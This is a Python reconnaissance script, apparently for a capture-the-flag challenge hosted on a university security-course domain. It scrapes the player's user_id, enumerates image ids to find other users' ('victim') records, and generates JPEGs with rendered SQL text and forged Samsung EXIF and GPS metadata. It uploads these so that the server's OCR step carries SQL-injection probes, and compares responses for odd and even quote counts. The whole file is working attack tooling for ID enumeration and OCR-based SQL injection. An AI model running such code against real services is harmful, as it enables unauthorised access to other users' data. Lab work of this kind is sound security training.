# recon_new.py — new instance. Get our user_id from the page, list our images, and re-confirm
# the OCR-injection signal (odd vs even quotes in SELECT context) that we saw before.
import requests, re, base64
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"

# 1) grab our user_id from the index HTML (#id_user hidden input)
html = requests.get(BASE + "/").text
m = re.search(r'id="id_user"[^>]*value="([0-9a-f-]{36})"', html)
UID = m.group(1) if m else None
print("our user_id:", UID)

# save for other scripts
open("uid.txt","w").write(UID or "")
open("base.txt","w").write(BASE)

# 2) list our images (ids reveal victim gaps)
data = requests.get(f"{BASE}/images/{UID}").json()
ids = sorted(x["id"] for x in data)
print("our ids:", ids)
if ids:
    missing = [i for i in range(1, max(ids)+1) if i not in ids]
    print("MISSING ids (victim):", missing)

# 3) landscape base for OCR payloads
base_img = Image.open("paisaje.png").convert("RGB")
def build(text, path, size=34, white_strip=True):
    W = min(1500, max(1000, 40+int(len(text)*size*0.60))); H=400
    img = base_img.resize((W,H)); d=ImageDraw.Draw(img)
    font=None
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: font=ImageFont.truetype(p,size); break
        except: pass
    if font is None: font=ImageFont.load_default()
    bbox=d.textbbox((20,20),text,font=font)
    if white_strip:
        d.rectangle([0,0,W,bbox[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=font,fill=(0,0,0))
    img.save(path,"jpeg",quality=75,optimize=True)
    def dms(x):
        dd=int(x);m=int((x-dd)*60);s=round((x-dd-m/60)*3600,4);return((dd,1),(m,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),path)
    return "data:image/jpeg;base64,"+base64.b64encode(open(path,"rb").read()).decode()

def up(text, desc):
    uri = build(text, "r.jpg")
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":desc,"user_id":UID})
    return r.status_code

q="'"
print("\n-- re-confirm OCR injection signal (paridad) --")
print("odd  (SELECT ''' FROM images) ->", up("SELECT "+q*3+" FROM images","R_odd"))
print("even (SELECT '' FROM images)  ->", up("SELECT "+q*2+" FROM images","R_even"))
# show what OCR stored
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    if img.get("description") in ("R_odd","R_even"):
        print(f"  {img['description']}: ocr={img.get('summary_ocr')!r}")
